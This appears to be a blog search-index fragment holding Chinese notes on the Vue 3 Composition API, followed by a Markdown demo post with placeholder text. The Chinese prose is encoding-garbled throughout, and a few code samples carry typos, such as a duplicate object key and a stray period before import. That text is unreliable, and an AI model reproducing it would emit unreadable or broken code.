42 43 44 45 46 47 48 49 50 51 52 53 54 55 import { ref, reactive, watch } from \u0026#34;vue\u0026#34; export default { setup() { const sum = ref(10) const msg = ref(\u0026#34;æ¸¬è©¦\u0026#34;) const person = reactive({ name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) // æƒ…æ³ä¸€ï¼šç›£è¦– ref å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“š watch(sum, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;sumè®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { immediate: true }) // æƒ…æ³äºŒï¼šåŒæ™‚ç›£è¦–å¤šå€‹ ref å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“š watch([sum, msg], (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;sumæˆ–msgè®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { immediate: true }) /* * æƒ…æ³ä¸‰ï¼šç›£è¦– reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šçš„å…¨éƒ¨å±¬æ€§ * 1. æ³¨æ„: æ­¤æ•¸ç„¡æ³•æ­£ç¢ºçš„ç²å– oldValue * 2. æ³¨æ„: å¼·åˆ¶é–‹å•Ÿäº†æ·±åº¦ç›£è¦–(deepé…ç½®ç„¡æ•ˆ) */ watch(person, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;personè®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { immediate: true, deep: false }) // æ­¤è™•çš„ deep é…ç½®ç„¡æ•ˆ // æƒ…æ³å››ï¼šç›£è¦– reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šçš„æŸå€‹å±¬æ€§ watch(() =\u0026gt; person.name, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;personçš„nameè®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { immediate: true }) // æƒ…æ³äº”ï¼šç›£è¦– reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šçš„æŸäº›å±¬æ€§ watch([() =\u0026gt; person.name, () =\u0026gt; person.age], (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;personçš„nameæˆ–ageè®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { immediate: true }) // ç‰¹æ®Šæƒ…æ³ï¼šç›£è¦– reactive å®šç¾©çš„éŸ¿æ‡‰å¼æ•¸æ“šçš„æŸäº›å°è±¡å±¬æ€§ watch(() =\u0026gt; person.job, (newValue, oldValue) =\u0026gt; { console.log(\u0026#34;personçš„jobè®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { immediate: true, deep: true }) // æ­¤è™•ç”±æ–¼ç›£è¦–çš„æ˜¯ reactive æ‰€å®šç¾©çš„å°è±¡ä¸­çš„æŸå€‹å±¬æ€§ï¼Œæ‰€ä»¥ deep é…ç½®æœ‰æ•ˆ return { sum, msg } } } watch æ™‚ value çš„å•é¡Œ è‹¥ç›£è¦–çš„æ•¸æ“šç‚º ref æ±‚åŠ© reactive ç”Ÿæˆçš„éŸ¿æ‡‰å¼æ•¸æ“šï¼Œå‰‡å¯ä½¿ç”¨ä»¥ä¸‹å…©ç¨®æ–¹å¼é€²è¡Œç›£è¦–ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 import { ref, watch } from \u0026#34;vue\u0026#34; export default { setup() { const sum = ref(0) const person = ref({ name: \u0026#34;å¼µä¸‰\u0026#34;, name: 18, job: { job1: { salary: 20 } } }) watch(sum, (newValue, oldValue) =\u0026gt; { // ç›£è¦–çš„æ˜¯ sum é€™å€‹ RefImpl æ•¸æ“šï¼Œå› æ­¤ä¸éœ€è¦ .value console.log(\u0026#34;sumçš„å€¼è®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }) // æ–¹æ³•ä¸€: watch(person.value, (newValue, oldValue) =\u0026gt; { // ç›£è¦– person.value çš„ Proxy å°è±¡ console.log(\u0026#34;personçš„å€¼è®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }) // æ–¹æ³•äºŒ: watch(person, (newValue, oldValue) =\u0026gt; { // æ·±åº¦ç›£è¦– person çš„ Proxy å°è±¡çš„å±¬æ€§ console.log(\u0026#34;personçš„å€¼è®ŠåŒ–äº†\u0026#34;, newValue, oldValue) }, { deep: true }) return { person } } } watchEffect æ™ºèƒ½ç‰ˆ watchï¼Œä¸ç”¨æŒ‡åç›£è¦–å“ªå€‹å±¬æ€§ï¼Œç›£è¦–çš„å›èª¿ä¸­ç”¨åˆ°å“ªå€‹å±¬æ€§ï¼Œå°±ç›£è¦–å“ªå€‹å±¬æ€§(è€Œä¸”æ˜¯æ·±å±¤æ¬¡çš„)ã€‚ watchEffect æœ‰é»åƒ computedï¼š ä½† computed æ³¨é‡è¨ˆç®—å‡ºä¾†çš„å€¼(å›èª¿å‡½æ•¸çš„è¿”å›å€¼)ï¼Œæ‰€ä»¥å¿…é ˆè¦å¯«è¿”å›å€¼ã€‚ è€Œ watchEffect æ›´æ³¨é‡çš„æ˜¯éç¨‹(å›èª¿å‡½æ•¸çš„å‡½æ•¸é«”)ï¼Œæ‰€ä»¥ä¸ç”¨å¯«è¿”å›å€¼ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import { ref, reactive, watchEffect } from \u0026#34;vue\u0026#34; export default { setup() { const sum = ref(0) const person = reactive({ name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) watchEffect(() =\u0026gt; { const x1 = sum.value const x2 = person.job.job1.salary console.log(\u0026#34;watchEffect é…ç½®çš„å›èª¿åŸ·è¡Œäº†\u0026#34;) }) } } è‡ªå®šç¾© hook å‡½æ•¸ hook æœ¬è³ªæ˜¯ä¸€å€‹å‡½æ•¸ï¼ŒæŠŠ setup å‡½æ•¸ä¸­ä½¿ç”¨çš„ Composition API é€²è¡Œäº†å°è£ã€‚ é¡ä¼¼æ–¼ vue 2.0 ä¸­çš„ mixinã€‚ è‡ªå®šç¾© hook çš„å„ªå‹¢ï¼šé‡è¤‡ä½¿ç”¨ä»£ç¢¼ï¼Œè®“ setup ä¸­çš„é‚è¼¯æ›´æ¸…æ¥šæ˜“æ‡‚ã€‚ å‘½åé€šå¸¸å»ºè­°ä»¥ \u0026ldquo;use\u0026rdquo; é–‹é ­ï¼Œä¾‹å¦‚ï¼š ä¸€å€‹ç²å–é¼ æ¨™é»æ“Šä½ç½®çš„ hook src/hooks/usePoint.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import { reactive, onMounted, onBeforeUnmount} from \u0026#34;vue\u0026#34; export default function() { // ç²å–é¼ æ¨™é»æ“Šä½ç½® ç›¸é—œçš„æ•¸æ“š let point = reactive({ x: 0, y: 0 }) // ç²å–é¼ æ¨™é»æ“Šä½ç½® ç›¸é—œçš„æ–¹æ³• function savePoint(event) { console.log(event.pageX, event.pageY) point.x = event.pageX point.y = event.pageY } // ç²å–é¼ æ¨™é»æ“Šä½ç½® ç›¸é—œçš„ç”Ÿå‘½é€±æœŸé‰¤å­ onMounted(() =\u0026gt; { window.addEventListener(\u0026#34;click\u0026#34;, savePoint) }) onBeforeUnmount(() =\u0026gt; { window.removeEventListener(\u0026#34;click\u0026#34;, savePoint) }) return point } Demo.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 import usePoint from \u0026#34;@/hooks/usePoint\u0026#34; export default { name: \u0026#34;Demo\u0026#34;, setup() { // ä½¿ç”¨è‡ªå®šç¾©çš„ hook const point = usePoint() return { point } } } toRef ä½œç”¨ï¼šå‰µå»ºä¸€å€‹ ref å°è±¡ï¼Œå…¶ value å€¼æŒ‡å‘(å¼•ç”¨)å¦ä¸€å€‹å°è±¡ä¸­çš„æŸå€‹å±¬æ€§(è¿”å›å€¼ç‚ºä¸€å€‹ ObjectRefImpl å°è±¡ï¼Œç‚ºéŸ¿æ‡‰å¼)ã€‚ èªæ³•ï¼š 1 const name = toRef(person, \u0026#34;name\u0026#34;) æ‡‰ç”¨ï¼šè¦å°‡éŸ¿æ‡‰å¼å°è±¡ä¸­çš„æŸå€‹å±¬æ€§å–®ç¨æä¾›çµ¦å¤–éƒ¨ä½¿ç”¨æ™‚ã€‚ æ“´å±•ï¼štoRefs èˆ‡ toRef åŠŸèƒ½ä¸€è‡´ï¼Œä½†å¯ä»¥æ‰¹é‡å‰µå»ºå¤šå€‹ ref å°è±¡ï¼Œèªæ³•ï¼š 1 toRefs(person) ä½¿ç”¨ç¯„ä¾‹ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 import { reactive, toRef, toRefs} from \u0026#34;vue\u0026#34; export default { setup() { let person = reactive({ name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) const name1 = person.name // name1 åƒ…ç‚ºè³¦å€¼ï¼Œç„¡éŸ¿æ‡‰å¼ const name2 = toRef(person, \u0026#34;name\u0026#34;) // name2 çš„å€¼æœƒæŒ‡å‘(å¼•ç”¨) person çš„ name return { // errorsï¼š // name1: person.name, // åƒ…ç‚ºè³¦å€¼ï¼Œç„¡éŸ¿æ‡‰å¼ // name2: ref(person.name) // åˆå§‹å€¼æ­£å¸¸ï¼Œä½†ä¿®æ”¹æ™‚ä¸æœƒæ”¹åˆ° person çš„ nameï¼Œå› ç‚ºæ­¤å¯«æ³•åƒ…æ˜¯å°‡ \u0026#34;ref(pserson.name)\u0026#34; è³¦å€¼çµ¦ name2ï¼Œè€Œéå°‡ name2 æŒ‡å‘ person çš„ name // successï¼š // æ¨¡æ¿ä¸­ä½¿ç”¨ {{ person.name }}...ç­‰ï¼š // person, // ä¸€å€‹ä¸€å€‹çµ¦å‡ºï¼Œæ¨¡æ¿ä¸­ä½¿ç”¨ {{ name }}...ç­‰ï¼š // name: toRef(person, \u0026#34;name\u0026#34;), // age: toRef(person, \u0026#34;age\u0026#34;), // salary: toRef(person.job.job1, \u0026#34;salary\u0026#34;) // ä¸€æ¬¡å…¨çµ¦å‡ºï¼Œæ¨¡æ¿ä¸­å¯ç›´æ¥ä½¿ç”¨ {{ name }}ã€{{ age }}ã€{{ job.job1.salary }} ...toRefs(person) } } } å…¶ä»–çš„ Composition API 1. shallowReactive èˆ‡ shallowRef shallowï¼šæ·ºå±¤çš„ shallowReactiveï¼šåªè™•ç†å°è±¡æœ€å¤–å±¤å±¬æ€§çš„éŸ¿æ‡‰å¼(æ·ºéŸ¿æ‡‰å¼)ã€‚ shallowRefï¼šåªè™•ç†åŸºæœ¬æ•¸æ“šé¡å‹çš„éŸ¿æ‡‰å¼ï¼Œä¸é€²è¡Œå°è±¡çš„éŸ¿æ‡‰å¼è™•ç†ã€‚ ä»€éº¼æ™‚å€™ä½¿ç”¨ï¼Ÿ å¦‚æœæœ‰ä¸€å€‹å°è±¡æ•¸æ“šï¼Œçµæ§‹æ¯”è¼ƒæ·±ï¼Œä½†è®ŠåŒ–æ™‚åªæ˜¯å¤–å±¤å±¬æ€§è®ŠåŒ– =\u0026gt; shallowReactiveã€‚ å¦‚æœæœ‰ä¸€å€‹å°è±¡æ•¸æ“šï¼Œå¾ŒçºŒåŠŸèƒ½ä¸æœƒä¿®æ”¹è©²å°è±¡ä¸­çš„å±¬æ€§ï¼Œè€Œæ˜¯ç”Ÿæˆæ–°çš„å°è±¡ä¾†æ›¿æ› =\u0026gt; shallowRefã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { shallowRef, shallowReactive, toRefs} from \u0026#34;vue\u0026#34; export default { setup() { let person = shallowReactive({ // åªè€ƒæ…®ç¬¬ä¸€å±¤æ•¸æ“šçš„éŸ¿æ‡‰å¼ name: \u0026#34;å¼µä¸‰\u0026#34;, // éŸ¿æ‡‰å¼ age: 18, // éŸ¿æ‡‰å¼ job: { // ééŸ¿æ‡‰å¼ job1: { salary: 20 } } }) let x = shallowRef({ // åŸºæœ¬é¡å‹æ™‚åŒ refï¼Œä½†å°è±¡é¡å‹ä¸æ˜¯éŸ¿æ‡‰å¼(value æœƒè®Šæˆä¸€èˆ¬çš„ Object è€Œä¸æ˜¯ Proxy ) y: 0 }) return { x, ...toRefs(person) } } } 2. readonly èˆ‡ shallowReadonly readonlyï¼šè®“ä¸€å€‹éŸ¿æ‡‰å¼æ•¸æ“šè®Šç‚ºå”¯è®€çš„(æ·±å±¤å”¯è®€)ã€‚ shallowReadonlyï¼šè®“ä¸€å€‹éŸ¿æ‡‰å¼æ•¸æ“šè®Šç‚ºå”¯è®€çš„(æ·ºå±¤å”¯è®€)ã€‚ æ‡‰ç”¨å ´æ™¯ï¼šä¸å¸Œæœ›æ•¸æ“šè¢«ä¿®æ”¹æ™‚ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import { ref, reactive, toRefs, readonly, shallowReadonly} from \u0026#34;vue\u0026#34; export default { setup() { let sum = ref(0) let person = reactive({ name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) // å°‡ sum è®Šç‚ºå”¯è®€ï¼Œä¿è­·æ•¸æ“šä¸è¢«ä¿®æ”¹ sum = readonly(sum) // å°‡ person çš„æ‰€æœ‰å±¬æ€§è®Šç‚ºå”¯è®€ï¼Œä¿è­·æ‰€æœ‰å±¬æ€§æ•¸æ“šä¸è¢«ä¿®æ”¹ person = readonly(person) // å°‡ person çš„\u0026#34;ç¬¬ä¸€å±¤å±¬æ€§æ•¸æ“š\u0026#34;è®Šç‚ºå”¯è®€(nameã€ageç„¡æ³•ä¿®æ”¹ï¼Œä½† job å¯ä»¥) person = shallowReadonly(person) return { sum, ...toRefs(person) } } } toRaw èˆ‡ markRaw rawï¼šåŸå§‹ã€‚ toRawï¼š ä½œç”¨ï¼šå°‡ä¸€å€‹ç”± reactive ç”Ÿæˆçš„éŸ¿æ‡‰å¼å°è±¡è½‰ç‚ºæ™®é€šå°è±¡ã€‚ æ‡‰ç”¨å ´æ™¯ï¼šç”¨æ–¼è®€å–éŸ¿æ‡‰å¼å°è±¡å°æ‡‰çš„æ™®é€šå°è±¡ï¼Œå°é€™å€‹æ™®é€šå°è±¡çš„æ‰€æœ‰æ“ä½œï¼Œä¸æœƒå¼•èµ·é é¢æ›´æ–°ã€‚ markRawï¼š ä½œç”¨ï¼šæ¨™è¨˜ä¸€å€‹å°è±¡ï¼Œä½¿å…¶æ°¸é ä¸æœƒå†æˆç‚ºéŸ¿æ‡‰å¼å°è±¡ã€‚ æ‡‰ç”¨å ´æ™¯ï¼š æœ‰äº›å€¼ä¸æ‡‰è¢«è¨­ç½®ç‚ºéŸ¿æ‡‰å¼çš„ï¼Œä¾‹å¦‚è¤‡é›œçš„ç¬¬ä¸‰æ–¹é¡åº«ç­‰ã€‚ ç•¶æ¸²æŸ“å…·æœ‰ä¸å¯è®Šæ•¸æ“šæºçš„å¤§åˆ—è¡¨æ™‚ï¼Œè·³ééŸ¿æ‡‰å¼è½‰æ›å¯ä»¥æé«˜æ€§èƒ½ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import { ref, reactive, toRaw, markRaw} from \u0026#34;vue\u0026#34; export default { setup() { let sum = ref(0) let person = reactive({ name: \u0026#34;å¼µä¸‰\u0026#34;, age: 18, job: { job1: { salary: 20 } } }) function showRawPerson() { const p = toRaw(person) console.log(p) // è¿”å›çš„ä¸å†æ˜¯ Proxyï¼Œè€Œæ˜¯ Object } function addCar() { let car = { name: \u0026#34;å¥”é¦³\u0026#34;, price: 40} person.car = markRaw(car) // æ¨™è¨˜ person.car ä¸æ˜¯éŸ¿æ‡‰å¼çš„æ•¸æ“š(æ•¸æ“šä¾èˆŠå¯ä¿®æ”¹ï¼Œä½†ç•«é¢ä¸æœƒè®Š) } return { sum, ...toRefs(person), showRawPerson, addCar } } } customRef ä½œç”¨ï¼šå‰µå»ºä¸€å€‹è‡ªå®šç¾©çš„ refï¼Œä¸¦å°å…¶ä¾è³´é …è·Ÿè¹¤å’Œæ›´æ–°è§¸ç™¼é€²è¡Œé¡¯ç¤ºæ§åˆ¶ã€‚ å¯¦ç¾é˜²æŠ–æ•ˆæœï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 \u0026lt;template\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;keyWord\u0026#34; /\u0026gt; \u0026lt;h3\u0026gt; {{ keyWord }} \u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref, customRef } from \u0026#34;vue\u0026#34; export default { setup() { // ä½¿ç”¨ vue æä¾›çš„ ref // let keyWord = ref(\u0026#34;hello\u0026#34;) // è‡ªå®šç¾©çš„ä¸€å€‹ ref function myRef(value, delay) { let timer return customRef((track, trigger) =\u0026gt; { return { get() { console.log(`æœ‰äººå¾ myRef é€™å€‹å®¹å™¨ä¸­è®€å–æ•¸æ“šäº†ï¼Œæˆ‘æŠŠ${value}çµ¦ä»–äº†`) track() // é€šçŸ¥ Vue è¿½è¹¤æ•¸æ“šçš„è®ŠåŒ–(æå‰èˆ‡ get å•†é‡ä¸€ä¸‹ï¼Œè®“å®ƒèªç‚ºé€™å€‹ value æ˜¯æœ‰ç”¨çš„) return value }, set(newValue) { console.log(`æœ‰äººæŠŠ myRef é€™å€‹å®¹å™¨ä¸­çš„æ•¸æ“šæ”¹ç‚ºäº†${newValue}`) clearTimeout(timer) timer = setTimeout(() =\u0026gt; { value = newValue trigger() // é€šçŸ¥ Vue å»é‡æ–°è§£ææ¨¡æ¿ï¼Œä»¥ä¾¿è§¸ç™¼ get }, delay) } } }) } // ä½¿ç”¨è‡ªå®šç¾©çš„é˜²æŠ– ref let keyWord = myRef(\u0026#34;hello\u0026#34;, 500) return { keyWord } } } \u0026lt;/script\u0026gt; provide èˆ‡ inject ä½œç”¨ï¼šå¯¦ç¾ç¥–å­«çµ„ä»¶é–“é€šä¿¡ã€‚ å¥—è·¯ï¼šçˆ¶çµ„ä»¶æœ‰ä¸€å€‹ provide é¸é …ä¾†æä¾›æ•¸æ“šï¼Œå¾Œä»£çµ„ä»¶æœ‰ä¸€å€‹ inject é¸é …ä¾†é–‹å§‹ä½¿ç”¨é€™äº›æ•¸æ“šã€‚ å…·é«”å¯«æ³•ï¼š 1. ç¥–çµ„ä»¶ä¸­ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 import { reactive, toRefs, provide } from \u0026#34;vue\u0026#34; export default { name: \u0026#34;App\u0026#34;, setup() { let car = reactive({ name: \u0026#34;å¥”é¦³\u0026#34;, price: \u0026#34;40W\u0026#34; }) provide(\u0026#34;car\u0026#34;, car) // çµ¦è‡ªå·±çš„å¾Œä»£çµ„ä»¶å‚³éæ•¸æ“š return { ...toRefs(car) } } } 2. å¾Œä»£çµ„ä»¶ä¸­ï¼š 1 2 3 4 5 6 7 8 9 import { inject } from \u0026#34;vue\u0026#34; export default { name: \u0026#34;Son\u0026#34;, setup() { let car = inject(\u0026#34;car\u0026#34;) console.log(car) return { car } } } éŸ¿æ‡‰å¼æ•¸æ“šçš„åˆ¤æ–· isRefï¼šæª¢æŸ¥ä¸€å€‹å€¼æ˜¯å¦ç‚ºä¸€å€‹ ref å°è±¡ã€‚ isReactiveï¼šæª¢æŸ¥ä¸€å€‹å°è±¡æ˜¯å¦æ˜¯ç”± reactive å‰µå»ºçš„éŸ¿æ‡‰å¼ä»£ç†ã€‚ isReadonlyï¼šæª¢æŸ¥ä¸€å€‹å°è±¡æ˜¯å¦æ˜¯ç”± readonly å‰µå»ºçš„å”¯è®€ä»£ç†ã€‚ isProxyï¼šæª¢æŸ¥ä¸€å€‹å°è±¡æ˜¯å¦æ˜¯ç”± reactive æˆ–æ˜¯ readonly æ–¹æ³•å‰µå»ºçš„ä»£ç†ã€‚ Teleport teleportï¼šå‚³é€ã€ç¬é–“ç§»å‹•ã€‚ ä½œç”¨ï¼šèƒ½å¤ å°‡æˆ‘å€‘çš„ çµ„ä»¶ html çµæ§‹ ç§»å‹•åˆ°æŒ‡å®šçš„ä½ç½®ã€‚ å…·é«”å¯«æ³•ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;teleport to=\u0026#34;body\u0026#34;\u0026gt; \u0026lt;!-- to ä¹Ÿèƒ½å¯« css selectï¼Œä¾‹å¦‚ to=\u0026#34;#app\u0026#34; --\u0026gt; \u0026lt;div v-if=\u0026#34;isShow\u0026#34; class=\u0026#34;mask\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;dialog\u0026#34;\u0026gt; \u0026lt;h3\u0026gt; æˆ‘æ˜¯ä¸€å€‹å½ˆçª— \u0026lt;/h3\u0026gt; \u0026lt;button @click=\u0026#34;isShow = false\u0026#34;\u0026gt; é—œé–‰å½ˆçª— \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/teleport\u0026gt; Suspense suspenseï¼šæ‡¸ç–‘ã€æ‡¸è€Œæœªæ±ºçš„ã€‚ ä½œç”¨ï¼šç­‰å¾…ç•°æ­¥çµ„ä»¶æ™‚ï¼Œæ¸²æŸ“ä¸€äº›é¡å¤–å…§å®¹ï¼Œè®“ä½¿ç”¨è€…æœ‰æ›´å¥½çš„ç”¨æˆ¶é«”é©—ã€‚ ä½¿ç”¨æ­¥é©Ÿï¼š ç•°æ­¥å¼•ç”¨çµ„ä»¶ 1 2 import { defineAsyncComponent } from \u0026#34;vue\u0026#34; // å®£å‘Šç•°æ­¥çµ„ä»¶æ™‚ä½¿ç”¨ const Child = defineAsyncComponent(() =\u0026gt;. import (\u0026#34;./components/Child.vue\u0026#34;)) ä½¿ç”¨ Suspense åŒ…è£¹çµ„ä»¶ï¼Œä¸¦é…ç½®å¥½ default èˆ‡ fallback 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;æˆ‘æ˜¯Appçµ„ä»¶\u0026lt;/h3\u0026gt; \u0026lt;Suspense\u0026gt; \u0026lt;template v-slot:default\u0026gt; \u0026lt;Child /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template v-slot:fallback\u0026gt; \u0026lt;h3\u0026gt;åŠ è¼‰ä¸­......\u0026lt;/h3\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/Suspense\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; å…¨å±€ API çš„è½‰ç§» Vue 2.0 æœ‰è¨±å¤šå…¨å±€ API å’Œé…ç½®ã€‚ ä¾‹å¦‚ï¼šè¨»å†Šå…¨å±€çµ„ä»¶ã€è¨»å†Šå…¨å±€æŒ‡ä»¤ç­‰ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // è¨»å†Šå…¨å±€çµ„ä»¶ Vue.component(\u0026#34;MyButton\u0026#34;, { data() { return { count: 0 } }, template: \u0026#34;\u0026lt;button @click=\u0026#39;count++\u0026#39;\u0026gt;Clicked {{ count }}\u0026lt;/button\u0026gt;\u0026#34; }) // è¨»å†Šå…¨å±€æŒ‡ä»¤ Vue.directive(\u0026#34;focus\u0026#34;, { inserted: el =\u0026gt; el.focus() }) Vue 3.0 ä¸­å°é€™äº› API åšå‡ºäº†èª¿æ•´ï¼š å°‡å…¨å±€çš„ APIï¼Œå³ï¼š Vue.xxx èª¿æ•´åˆ°æ‡‰ç”¨å¯¦ä¾‹(app)ä¸Š 2.0 å…¨å±€ API(Vue) 3.0 å¯¦ä¾‹ API(app) Vue.config.xxxx app.config.xxxx Vue.config.productionTip ç§»é™¤ Vue.component app.component Vue.directive app.directive Vue.mixin app.mixin Vue.use app.use Vue.prototype app.config.globalProperties ","date":"2022-07-17T00:00:00Z","image":"https://wayneblog.ga/2022-07-17/atguigu-vue3-note/index_huc185496ed55e6f95ddd80689badb475a_232407_120x120_fill_q75_box_smart1.jpeg","permalink":"https://wayneblog.ga/2022-07-17/atguigu-vue3-note/","title":"å°šç¡…è°· Vue3 è¦–é »ç­†è¨˜"},{"content":"Markdown æ˜¯è®“ä½ å¿«é€Ÿæ’°å¯«ç­†è¨˜ï¼Œæµæš¢ç®¡ç†çŸ¥è­˜ï¼Œæ”¯æ´å¤šç¨®è¡ç”ŸåŠŸèƒ½çš„ç”Ÿç”¢åŠ›å·¥å…·\næ¨™é¡Œ ç•¶æ‚¨æƒ³è¦å°‡ä¸€æ®µæ–‡å­—æ¨™ç¤ºç‚ºæ¨™é¡Œçš„æ™‚å€™ï¼Œè«‹ä½¿ç”¨é€™å€‹èªæ³•ã€‚\nè«‹åœ¨è¡Œé¦–è¼¸å…¥ # ç¬¦è™Ÿï¼Œä¸¦åœ¨å¾Œé¢åŠ ä¸Šä¸€å€‹ç©ºç™½å¾Œï¼Œå†è¼¸å…¥æ¨™é¡Œæ–‡å­—ã€‚\næ¨™é¡Œæœ‰åˆ†æˆ 6 å€‹å±¤ç´šï¼Œ# çš„æ•¸é‡æ„ˆå¤šï¼Œå±¤ç´šè¶Šä½ã€‚\n1 2 3 4 5 6 # ç¬¬ä¸€å±¤ç´šæ¨™é¡Œ h1 ## ç¬¬äºŒå±¤ç´šæ¨™é¡Œ h2 ### ç¬¬ä¸‰å±¤ç´šæ¨™é¡Œ h3 #### ç¬¬å››å±¤ç´šæ¨™é¡Œ h4 ##### ç¬¬äº”å±¤ç´šæ¨™é¡Œ h5 ###### ç¬¬å…­å±¤ç´šæ¨™é¡Œ h6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\nâ€” Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] List Types Ordered List First item 